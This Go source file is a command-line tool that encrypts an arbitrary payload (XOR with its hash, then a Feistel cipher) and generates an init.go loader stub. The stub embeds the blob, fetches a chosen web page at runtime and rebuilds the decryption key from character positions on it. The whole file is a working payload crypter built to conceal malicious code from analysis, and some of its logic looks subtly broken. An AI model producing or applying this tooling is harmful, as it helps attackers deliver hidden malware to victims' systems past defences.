package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/hex"
	"flag"
	"fmt"
	"github.com/cyrildever/feistel"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"time"
)

var Chars = []string{"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/", "="}

const base = `package main
import (
	"io/ioutil"
	"io"
	"net/http"
	"log"
	"github.com/cyrildever/feistel"
	"bytes"
	_ "embed"
	"fmt"
)
//go:embed payload.bin
var payloadBin []byte
var stringPayload string
var DecryptedPayload []byte

	var Payload []byte

	func xor(f []byte, key string) []byte {
	buf := make([]byte, 1)
	bufw := []byte{}
	reader := bytes.NewReader(f)
	for {
		n, err := reader.Read(buf)
		if err != nil {
			if err != io.EOF {
				log.Fatal(err)
			}
			break
		}
		bite := byte(key[n%s(len(key))])
		writebuf := make([]byte, 0)
		writebuf = append(writebuf, bite)
		xord, err := XORBytes(writebuf, buf[0:n])
		bufw = append(bufw, xord[0])
	}
	return bufw
}

func XORBytes(a, b []byte) ([]byte, error) {
	if len(a) != len(b) {
		return nil, fmt.Errorf("length of byte slices is not equivalent: %s != %s", len(a), len(b))
	}

	buf := make([]byte, len(a))

	for i := range a {
		buf[i] = a[i] ^ b[i]
	}

	return buf, nil
}

	func init(){
		Payload = make([]byte, 64)
		r, _ := http.Get("%s")
		defer r.Body.Close()
		body, _ := ioutil.ReadAll(r.Body)
		`

const feistalSetup = `
		keys := make([]string, %d)
`

const feistalKey = `
		keys[%d] = "%s"
`

const feistalInit = `
		cipher := feistel.NewCustomCipher(keys)
		stringPayload, _ = cipher.Decrypt(payloadBin)
		DecryptedPayload = xor([]byte(stringPayload), string(Payload))

`

//const StringTemplate = "Payload = append(Payload, []byte(%s)...)"
//const IntTemplate = "Payload = append(Payload, body[%d])"

const StringTemplate = "Payload[%d] = []byte(%s)[0]"
const IntTemplate = "Payload[%d] = body[%d]"

const end = `
}
`

var targetPayload string
var targetUrl string

type Base64Map struct {
	La    []int
	Lb    []int
	Lc    []int
	Ld    []int
	Le    []int
	Lf    []int
	Lg    []int
	Lh    []int
	Li    []int
	Lj    []int
	Lk    []int
	Ll    []int
	Lm    []int
	Ln    []int
	Lo    []int
	Lp    []int
	Lq    []int
	Lr    []int
	Ls    []int
	Lt    []int
	Lu    []int
	Lv    []int
	Lw    []int
	Lx    []int
	Ly    []int
	Lz    []int
	A     []int
	B     []int
	C     []int
	D     []int
	E     []int
	F     []int
	G     []int
	H     []int
	I     []int
	J     []int
	K     []int
	L     []int
	M     []int
	N     []int
	O     []int
	P     []int
	Q     []int
	R     []int
	S     []int
	T     []int
	U     []int
	V     []int
	W     []int
	X     []int
	Y     []int
	Z     []int
	N0    []int
	N1    []int
	N2    []int
	N3    []int
	N4    []int
	N5    []int
	N6    []int
	N7    []int
	N8    []int
	N9    []int
	Plus  []int
	Slash []int
	Equal []int
}

func LoadMap(url string) Base64Map {
	c := http.Client{Timeout: 1 * time.Second}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		panic(err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	r, err := c.Do(req)
	if err != nil {
		fmt.Println(err)
		return Base64Map{}
	}
	defer r.Body.Close()
	body, _ := ioutil.ReadAll(r.Body)
	baseMap := Base64Map{}
	sourceLen := len(body)
	for i := 0; i < sourceLen; i++ {
		switch body[i] {
		case 'a':
			baseMap.La = append(baseMap.La, i)
		case 'b':
			baseMap.Lb = append(baseMap.Lb, i)
		case 'c':
			baseMap.Lc = append(baseMap.Lc, i)
		case 'd':
			baseMap.Ld = append(baseMap.Ld, i)
		case 'e':
			baseMap.Le = append(baseMap.Le, i)
		case 'f':
			baseMap.Lf = append(baseMap.Lf, i)
		case 'g':
			baseMap.Lg = append(baseMap.Lg, i)
		case 'h':
			baseMap.Lh = append(baseMap.Lh, i)
		case 'i':
			baseMap.Li = append(baseMap.Li, i)
		case 'j':
			baseMap.Lj = append(baseMap.Lj, i)
		case 'k':
			baseMap.Lk = append(baseMap.Lk, i)
		case 'l':
			baseMap.Ll = append(baseMap.Ll, i)
		case 'm':
			baseMap.Lm = append(baseMap.Lm, i)
		case 'n':
			baseMap.Ln = append(baseMap.Ln, i)
		case 'o':
			baseMap.Lo = append(baseMap.Lo, i)
		case 'p':
			baseMap.Lp = append(baseMap.Lp, i)
		case 'q':
			baseMap.Lq = append(baseMap.Lq, i)
		case 'r':
			baseMap.Lr = append(baseMap.Lr, i)
		case 's':
			baseMap.Ls = append(baseMap.Ls, i)
		case 't':
			baseMap.Lt = append(baseMap.Lt, i)
		case 'u':
			baseMap.Lu = append(baseMap.Lu, i)
		case 'v':
			baseMap.Lv = append(baseMap.Lv, i)
		case 'w':
			baseMap.Lw = append(baseMap.Lw, i)
		case 'x':
			baseMap.Lx = append(baseMap.Lx, i)
		case 'y':
			baseMap.Ly = append(baseMap.Ly, i)
		case 'z':
			baseMap.Lz = append(baseMap.Lz, i)
		case 'A':
			baseMap.A = append(baseMap.A, i)
		case 'B':
			baseMap.B = append(baseMap.B, i)
		case 'C':
			baseMap.C = append(baseMap.C, i)
		case 'D':
			baseMap.D = append(baseMap.D, i)
		case 'E':
			baseMap.E = append(baseMap.E, i)
		case 'F':
			baseMap.F = append(baseMap.F, i)
		case 'G':
			baseMap.G = append(baseMap.G, i)
		case 'H':
			baseMap.H = append(baseMap.H, i)
		case 'I':
			baseMap.I = append(baseMap.I, i)
		case 'J':
			baseMap.J = append(baseMap.J, i)
		case 'K':
			baseMap.K = append(baseMap.K, i)
		case 'L':
			baseMap.L = append(baseMap.L, i)
		case 'M':
			baseMap.M = append(baseMap.M, i)
		case 'N':
			baseMap.N = append(baseMap.N, i)
		case 'O':
			baseMap.O = append(baseMap.O, i)
		case 'P':
			baseMap.P = append(baseMap.P, i)
		case 'Q':
			baseMap.Q = append(baseMap.Q, i)
		case 'R':
			baseMap.R = append(baseMap.R, i)
		case 'S':
			baseMap.S = append(baseMap.S, i)
		case 'T':
			baseMap.T = append(baseMap.T, i)
		case 'U':
			baseMap.U = append(baseMap.U, i)
		case 'V':
			baseMap.V = append(baseMap.V, i)
		case 'W':
			baseMap.W = append(baseMap.W, i)
		case 'X':
			baseMap.X = append(baseMap.X, i)
		case 'Y':
			baseMap.Y = append(baseMap.Y, i)
		case 'Z':
			baseMap.Z = append(baseMap.Z, i)
		case '0':
			baseMap.N0 = append(baseMap.N0, i)
		case '1':
			baseMap.N1 = append(baseMap.N1, i)
		case '2':
			baseMap.N2 = append(baseMap.N2, i)
		case '3':
			baseMap.N3 = append(baseMap.N3, i)
		case '4':
			baseMap.N4 = append(baseMap.N4, i)
		case '5':
			baseMap.N5 = append(baseMap.N5, i)
		case '6':
			baseMap.N6 = append(baseMap.N6, i)
		case '7':
			baseMap.N7 = append(baseMap.N7, i)
		case '8':
			baseMap.N8 = append(baseMap.N8, i)
		case '9':
			baseMap.N9 = append(baseMap.N9, i)
		case '/':
			baseMap.Slash = append(baseMap.Slash, i)
		case '=':
			baseMap.Equal = append(baseMap.Equal, i)
		case '+':
			baseMap.Plus = append(baseMap.Plus, i)

		}
	}
	return baseMap
}

func (baseMap Base64Map) getLetter(char string) []int {
	switch char {
	case "a":
		return baseMap.La
	case "b":
		return baseMap.Lb
	case "c":
		return baseMap.Lc
	case "d":
		return baseMap.Ld
	case "e":
		return baseMap.Le
	case "f":
		return baseMap.Lf
	case "g":
		return baseMap.Lg
	case "h":
		return baseMap.Lh
	case "i":
		return baseMap.Li
	case "j":
		return baseMap.Lj
	case "k":
		return baseMap.Lk
	case "l":
		return baseMap.Ll
	case "m":
		return baseMap.Lm
	case "n":
		return baseMap.Ln
	case "o":
		return baseMap.Lo
	case "p":
		return baseMap.Lp
	case "q":
		return baseMap.Lq
	case "r":
		return baseMap.Lr
	case "s":
		return baseMap.Ls
	case "t":
		return baseMap.Lt
	case "u":
		return baseMap.Lu
	case "v":
		return baseMap.Lv
	case "w":
		return baseMap.Lw
	case "x":
		return baseMap.Lx
	case "y":
		return baseMap.Ly
	case "z":
		return baseMap.Lz
	case "A":
		return baseMap.A
	case "B":
		return baseMap.B
	case "C":
		return baseMap.C
	case "D":
		return baseMap.D
	case "E":
		return baseMap.E
	case "F":
		return baseMap.F
	case "G":
		return baseMap.G
	case "H":
		return baseMap.H
	case "I":
		return baseMap.I
	case "J":
		return baseMap.J
	case "K":
		return baseMap.K
	case "L":
		return baseMap.L
	case "M":
		return baseMap.M
	case "N":
		return baseMap.N
	case "O":
		return baseMap.O
	case "P":
		return baseMap.P
	case "Q":
		return baseMap.Q
	case "R":
		return baseMap.R
	case "S":
		return baseMap.S
	case "T":
		return baseMap.T
	case "U":
		return baseMap.U
	case "V":
		return baseMap.V
	case "W":
		return baseMap.W
	case "X":
		return baseMap.X
	case "Y":
		return baseMap.Y
	case "Z":
		return baseMap.Z
	case "0":
		return baseMap.N0
	case "1":
		return baseMap.N1
	case "2":
		return baseMap.N2
	case "3":
		return baseMap.N3
	case "4":
		return baseMap.N4
	case "5":
		return baseMap.N5
	case "6":
		return baseMap.N6
	case "7":
		return baseMap.N7
	case "8":
		return baseMap.N8
	case "9":
		return baseMap.N9
	case "/":
		return baseMap.Slash
	case "=":
		return baseMap.Equal
	case "+":
		return baseMap.Plus
	}
	return nil
}

func XORBytes(a, b []byte) ([]byte, error) {
	if len(a) != len(b) {
		return nil, fmt.Errorf("length of byte slices is not equivalent: %d != %d", len(a), len(b))
	}

	buf := make([]byte, len(a))

	for i := range a {
		buf[i] = a[i] ^ b[i]
	}

	return buf, nil
}

func xor(f *os.File, key string) []byte {
	buf := make([]byte, 1)
	bufw := []byte{}
	reader := bufio.NewReader(f)
	for {
		n, err := reader.Read(buf)
		if err != nil {
			if err != io.EOF {
				log.Fatal(err)
			}
			break
		}
		bite := byte(key[n%(len(key))])
		writebuf := make([]byte, 0)
		writebuf = append(writebuf, bite)
		xord, err := XORBytes(writebuf, buf[0:n])
		bufw = append(bufw, xord[0])
	}
	return bufw
}

func main() {
	flag.StringVar(&targetPayload, "p", "", "payload to be encoded")
	flag.StringVar(&targetUrl, "u", "", "URL to use as a book cipher")
	flag.Parse()

	if targetPayload == "" || targetUrl == "" {
		fmt.Println("Usage: -p <payload> -u <url>")
		return
	}
	baseMap := LoadMap(targetUrl)
	test, _ := os.ReadFile(targetPayload)
	payload, _ := os.Open(targetPayload)

	xorSha := sha256.New()
	xorSha.Write(test)
	xorHash := xorSha.Sum(nil)
	xorHashString := hex.EncodeToString(xorHash)

	firstXor := xor(payload, xorHashString)

	numPrimes := rand.Intn(20) + 10

	primes := make([]int, numPrimes)
	for i := 0; i < numPrimes; i++ {
		primes[i] = rand.Intn(1000000) + 10000
	}

	keyPrimes := make([]int, numPrimes)
	for i := 0; i < numPrimes; i++ {
		primeList := sieveOfEratosthenes(primes[i])
		keyPrimes[i] = primeList[rand.Intn(len(primeList)-1)]
	}
	keys := make([]string, numPrimes)
	for i := 0; i < len(keyPrimes); i++ {
		keySha := sha256.New()
		keySha.Write([]byte(strconv.Itoa(keyPrimes[i]) + xorHashString))
		keyHash := keySha.Sum(nil)
		keys[i] = hex.EncodeToString(keyHash)
	}

	cipher := feistel.NewCustomCipher(keys)

	payloadBytes, err := cipher.Encrypt(string(firstXor))
	if err != nil {
		log.Fatal(err)
	}

	os.WriteFile("payload.bin", payloadBytes, 0644)

	f, _ := os.OpenFile("init.go", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	f.Write([]byte(fmt.Sprintf(base, "%", "d", "d", targetUrl)))

	f.Write([]byte(fmt.Sprintf(feistalSetup, len(keys))))
	for i := 0; i < len(keys); i++ {
		f.Write([]byte(fmt.Sprintf(feistalKey, i, keys[i])))
	}

	for i := 0; i < len(xorHashString); i++ {

		char := string(xorHashString[i])
		intMaps := baseMap.getLetter(char)
		if len(intMaps) == 0 {
			f.Write([]byte("\n" + fmt.Sprintf(StringTemplate, i, "\""+char+"\"")))
		} else if len(intMaps) == 1 {
			f.Write([]byte("\n" + fmt.Sprintf(IntTemplate, i, intMaps[0])))
		} else {
			f.Write([]byte("\n" + fmt.Sprintf(IntTemplate, i, intMaps[rand.Intn(len(intMaps)-1)])))
		}
	}
	f.Write([]byte(fmt.Sprintf(feistalInit)))
	f.Write([]byte("\n" + end))

}

func sieveOfEratosthenes(N int) (primes []int) {
	b := make([]bool, N)
	for i := 2; i < N; i++ {
		if b[i] == true {
			continue
		}
		primes = append(primes, i)
		for k := i * i; k < N; k += i {
			b[k] = true
		}
	}
	return
}
